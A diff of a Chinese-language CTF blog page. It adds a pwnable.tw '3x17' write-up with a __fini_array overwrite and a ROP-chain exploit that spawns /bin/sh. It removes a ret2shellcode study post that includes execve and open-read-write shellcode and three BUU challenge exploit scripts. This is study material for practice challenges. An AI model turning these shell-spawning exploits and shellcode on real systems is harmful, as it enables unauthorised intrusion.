@@ -155,6 +155,104 @@
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/20/writeup-3x17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/20/writeup-3x17/" class="post-title-link" itemprop="url">pwnable.tw writeup-3x17</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-01-20 22:25:56 / Modified: 22:28:23" itemprop="dateCreated datePublished" datetime="2025-01-20T22:25:56+08:00">2025-01-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a><em>3x17</em></h1><h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
+<li><code>ida</code>中，交叉引用<code>X</code>，对函数进行重命名<code>N</code>。</li>
+<li>程序最开始执行的是<code>start</code>函数，<code>start</code>调用<code>__libc_start_main</code>函数，然后程序执行<code>__libc_csu_init</code>函数，接着才执行<code>main</code>函数，最后执行<code>__libc_csu_fini</code>函数。<code>__libc_start_main</code>的函数原型是<code>__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</code>。</li>
+<li>在<code>__libc_csu_init</code>函数中程序会执行<code>_init,__init_array[0],__init_array[1]...__init_array[n]</code>，在<code>__libc_csu_fini</code>函数中程序会执行<code>__fini_array[n]...__fini_array[1],__fini_array[0],_fini</code>。</li>
+</ol>
+<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227301.png" alt="1"></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="寻找-main-函数"><a href="#寻找-main-函数" class="headerlink" title="寻找_main_函数"></a>寻找_main_函数</h4><p>静态链接的程序，函数名符号表都被去除了，我们可以通过以下两种方法寻找<em>main</em>函数</p>
+<p>运行程序可以发现关键字符串<em>addr:<em>，在</em>ida</em>中双击<em>addr:</em></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227737.png" alt="2"></p>
+<p>然后点击<em>buf</em>，并进行交叉引用<code>X</code>，如图<code>0x401B6D</code>就是<em>main</em>函数的地址</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227710.png" alt="3"></p>
+<p>第二种方法其实就是去探究<em>main</em>是怎么出现的。</p>
+<p>首先通过命令<code>readelf -h 3x17</code>，我们可以查看程序的人口地址，如图是<code>0x401a50</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227397.png" alt="4"></p>
+<p>可以用<code>G</code>，在<em>ida</em>中搜索地址，发现就是<em>start</em>函数的地址，故程序运行的第一个函数其实是<em>start</em>函数</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228584.png" alt="5"></p>
+<p>将一个正常的程序的<em>start</em>函数，与该程序的<em>start</em>函数对比，可以发现二者几乎完全相同</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228194.png" alt="6"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx  ;rtld_fini</span><br><span class="line">pop     rsi  ;argc</span><br><span class="line">mov     rdx, rsp  ;ubp_av</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp  ;stack_end</span><br><span class="line">mov     r8, offset sub_402960  ;fini</span><br><span class="line">mov     rcx, offset sub_4028D0  ;init</span><br><span class="line">mov     rdi, offset sub_401B6D  ;main</span><br><span class="line">db      67h</span><br><span class="line">call    sub_401EB0  ;__libc_start_main</span><br><span class="line">hlt</span><br><span class="line">; &#125; // starts at 401A50</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>
+
+<p>所以*__libc_start_main<em>函数的原型如下，与此同时我们也就找到了</em>main*函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</span><br><span class="line"><span class="comment">//这里说一下64位程序函数传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9,r10</span></span><br></pre></td></tr></table></figure>
+
+<p>最后我们可以用<code>N</code>，在<em>ida</em>中对函数进行重命名</p>
+<h4 id="分析-libc-csu-fini-函数"><a href="#分析-libc-csu-fini-函数" class="headerlink" title="分析___libc_csu_fini_函数"></a>分析___libc_csu_fini_函数</h4><p>下面是*__libc_csu_fini*函数的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402960 fini            proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100 </span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0  #__fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]  ;</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     _term_proc</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C fini            endp</span><br></pre></td></tr></table></figure>
+
+<p>​	<em>__fini_array</em>是一个数组，<code>0x4b40f0</code>是*__fini_array<em>的首地址，在</em>gdb<em>调试的过程中，发现<code>__libc_csu_fini</code>这个函数其实就是先调用</em>__fini_array[1]<em>，再执行</em>__fini_array[0]*。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	运行程序后程序让我们先输入一个地址，再输入数据，漏洞点可能是任意地址改写。而我们又知道*__libc_csu_fini<em>函数会先执行</em>__fini_array[1]<em>，再执行</em>__fini_array[0]<em>，所以如果我们把</em>main<em>函数地址写到</em>__fini_array[1]*中，程序是不是就会一直循环写入内容。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>))</span><br></pre></td></tr></table></figure>
+
+<p>试了一下后发现这样不行，后来发现还要把*__libc_csu_fini<em>函数写到</em>__fini_array[0]*中，如图，这样就可以一直循环写了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>)+p64(<span class="number">0x402960</span>))</span><br><span class="line"><span class="comment">#程序会先把main写到__fini_array[0]，再把0x402960写到__fini_array[0]的下一个内存单元，即__fini_array[1]中</span></span><br></pre></td></tr></table></figure>
+
+<p>由于读入有字数限制，所以只能通过多次任意地址写在*__fini_array+0x10<em>布置我们构造的</em>rop<em>链，然后我们再通过栈迁移，将栈迁移到_fini_array+0x10_上，去执行</em>ROP*链。</p>
+<p>还有一点，一开始我以<code>p64()</code>形式发送<em>addr</em>的时候，第二次读入<em>read</em>函数的<em>rdi</em>总是为<code>0</code>，但是以<code>str()</code>形式发送后就没问题了。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./3x17&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment"># debug(p,0x402960,0x401BDC,0x401C29,0x401C13)</span></span><br><span class="line">debug(p,<span class="number">0x401bdc</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000446e35</span></span><br><span class="line">pop_rax = <span class="number">0x000000000041e4af</span></span><br><span class="line">syscall = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401c4b</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">fini_array0 = <span class="number">0x4b40f0</span></span><br><span class="line">fini_array1 = <span class="number">0x4b40f8</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">fini = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4B94A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">payload = p64(pop_rdi)+p64(bss)+p64(pop_rsi)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 = p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">attack(fini_array0,p64(fini)+p64(main))</span><br><span class="line">attack(bss,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">attack(fini_array0+<span class="number">0x10</span>,payload)</span><br><span class="line">attack(fini_array0+<span class="number">0x28</span>,payload1)</span><br><span class="line">attack(fini_array0+<span class="number">0x40</span>,payload2)</span><br><span class="line">attack(fini_array0,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<em>flag</em></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228754.png" alt="7"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1151,141 +1249,6 @@
   
   
 
-      
-  
-  
-   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/09/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%85%B3%E4%BA%8Eret2shellcode%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_1.jpg">
-      <meta itemprop="name" content="Qwen">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Qwen's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/09/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%85%B3%E4%BA%8Eret2shellcode%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于ret2shellcode的学习总结</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-12-09 14:09:43" itemprop="dateCreated datePublished" datetime="2023-12-09T14:09:43+08:00">2023-12-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-07-11 02:11:24" itemprop="dateModified" datetime="2024-07-11T02:11:24+08:00">2024-07-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="关于-ret2shellcode-的学习总结"><a href="#关于-ret2shellcode-的学习总结" class="headerlink" title="关于_ret2shellcode_的学习总结"></a>关于_ret2shellcode_的学习总结</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="什么是ret2shellcode"><a href="#什么是ret2shellcode" class="headerlink" title="什么是ret2shellcode"></a>什么是<code>ret2shellcode</code></h3><p>​	<code>ret2shellcode</code>，即<code>return to shellcode</code>意思是劫持函数返回地址为<code>shellcode</code>的地址，进而控制程序执行<code>shellcode</code>，拿到<code>shell</code>。</p>
-<h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a><code>NX</code>保护</h3><blockquote>
-<p>​	<strong><code>NX</code>保护：将数据（堆，栈）所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>cpu</code>就会抛出异常，而不是去执行恶意指令。</strong></p>
-</blockquote>
-<h4 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a><code>mprotect</code>函数</h4><ul>
-<li><p>开启了<code>NX</code>保护，内存页不能执行。如果能在程序中找到<code>mprotect</code>函数，我们便可利用该函数修改内存页的访问权限，然后便可在内存页写入<code>shellcode</code>，获得<code>shell</code>。</p>
-</li>
-<li><p>下面是<code>mprotect</code>函数原型</p>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br><span class="line"><span class="comment">//addr指向要修改的内存页的起始地址，一个内存页大小为4096(0x1000)字节</span></span><br><span class="line"><span class="comment">//len是要修改的内存长度（以字节为单位）</span></span><br><span class="line"><span class="comment">//prot表示要修改成什么权限（4，2，1 可读可写可执行）</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在<code>ida</code>中<code>Ctrl+s</code>可以查看各个段的起始地址</li>
-</ul>
-<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><code>shellcode</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">open(flag_addr,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">//flag_addr是要打开文件的地址</span></span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//一个进程有默认的文件描述符0，1，2。当打开一个新的文件后，新文件的文件描述符就是3，后面再打开的文件的文件描述符以此类推</span></span><br><span class="line">    <span class="comment">//addr可以是任意普通地址</span></span><br><span class="line">    <span class="comment">//0x50是要读的内容的大小</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">//文件描述符0，1，2 分别是：标准输入，标准输出，标准错误</span></span><br><span class="line">    <span class="comment">//这里的addr要与read函数中的addr一样</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a><code>32</code>位</h4><p>​	系统调用存储参数的前<code>3</code>个寄存器：<code>ebx,ecx,edx</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>文件中查看，<code>eax</code>存储系统调用号，执行<code>int 0x80</code>指令进行系统调用。</p>
-<h5 id="execve"><a href="#execve" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx </span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx ;ebx中现在为0</span><br><span class="line">push ebx ;先把一个0压入栈，用来截断字符串</span><br><span class="line">push 0x68732f2f ;把//sh压入栈</span><br><span class="line">push 0x6e69622f ;把/bin压入栈</span><br><span class="line">mov ebx,esp ;把esp指向的地址赋给了ebx，此时ebx中放的是/bin//sh的地址</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-<h5 id="open-read-write"><a href="#open-read-write" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a><code>64</code>位</h4><p>​	系统调用存储参数的前<code>6</code>个寄存器：<code>rdi,rsi,rdx,r10,r8,r9</code>，函数的系统调用号可在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>文件中查看，<code>rax</code>存储系统调用号，执行<code>syscall</code>指令进行系统调用。</p>
-<h5 id="execve-1"><a href="#execve-1" class="headerlink" title="execve"></a><code>execve</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f #/bin(2f62696e) /sh(2f7368)</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<h5 id="open-read-write-1"><a href="#open-read-write-1" class="headerlink" title="open_read_write"></a><code>open_read_write</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<p>​	我们可以利用<code>pwntools</code>中的<code>asm</code>把写好的汇编代码直接转换成机器码</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>下面是三道_BUU_上的例题</p>
-<h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><code>others_shellcode</code></h3><p>这道题直接发送<code>shellcode</code>即可，<code>exp</code>如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25752</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>得到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101207042.png" alt="image-20231210222035500"></p>
-<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><code>ciscn_2019_n_5</code></h3><p>拿到题目，先检查保护，没开保护，<code>64</code>位程序</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101206432.png" alt="image-20231210134205669"></p>
-<p>拖入<code>ida</code>，</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101207187.png" alt="image-20231210134506057"></p>
-<p>运行程序，有两次输入的地方</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101207542.png" alt="image-20231210134611131"></p>
-<p><code>Shift+F12</code>查看字符串，没有找到我们想要的<code>/bin/sh</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101207098.png" alt="image-20231210134823032"></p>
-<p>再看右边函数，也没有<code>system</code>函数</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101208122.png" alt="image-20231210134953135"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210140546109](https://raw.githubusercontent.com/Qwen11/picture/main/202407101208640.png)</span><br><span class="line"></span><br><span class="line">我们可以先把```shellcode```写到```bss```段，然后在栈溢出劫持函数返回地址为```shellcode```的起始地址</span><br><span class="line"></span><br><span class="line">计算偏移量为```0x28```</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/Qwen11/picture/main/202407101209820.png)</span><br><span class="line"></span><br><span class="line">#### ```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ciscn_2019_n_5&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26032)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall                </span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">bss_addr = 0x601080</span><br><span class="line">payload = b&#x27;a&#x27;*0x28+p64(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>得到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101209610.png" alt="image-20231210150043471"></p>
-<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a><code>ez_pz_hackover_2016</code></h3><p>拿到题目，检查保护，<code>PIE,NX,canary</code>都没开，是<code>32</code>位程序</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101209487.png" alt="image-20231210192130416"></p>
-<p>拖入<code>ida</code>中，分析题目</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101209109.png" alt="image-20231210200953491"></p>
-<p>先进入<code>header</code>函数中看看，就是输出图形的，没什么问题</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101209170.png" alt="image-20231210201032463"></p>
-<p>再进入<code>chall</code>函数中看看，我们主要分析的应该就是这个函数了</p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101210439.png" alt="image-20231210202908607"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231210203253498](https://raw.githubusercontent.com/Qwen11/picture/main/202407101210869.png)</span><br><span class="line"></span><br><span class="line">计算缓冲区到```shellcode```的偏移量为```0x1c```</span><br><span class="line"></span><br><span class="line">![image-20231210200821951](https://raw.githubusercontent.com/Qwen11/picture/main/202407101210833.png)</span><br><span class="line"></span><br><span class="line">#### `exp`</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,26101)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash: &#x27;)</span><br><span class="line">s_addr = int(p.recv(10),16)</span><br><span class="line">shellcode_addr = s_addr-28</span><br><span class="line"></span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload = b&#x27;crashme\x00&#x27;+b&#x27;a&#x27;*18+p32(shellcode_addr)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>得到<code>flag</code></p>
-<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101210220.png" alt="image-20231210215133554"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1357,7 +1320,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
